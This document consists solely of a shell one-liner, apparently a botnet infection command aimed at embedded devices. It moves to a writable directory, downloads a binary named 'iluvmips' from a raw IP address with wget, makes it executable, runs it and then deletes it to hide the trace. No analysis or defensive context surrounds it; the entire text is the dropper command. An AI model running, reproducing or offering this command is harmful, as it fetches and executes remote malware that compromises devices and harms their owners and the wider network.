cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://185.77.128.192/iluvmips; chmod +x iluvmips; ./iluvmips; rm -rf iluvmips
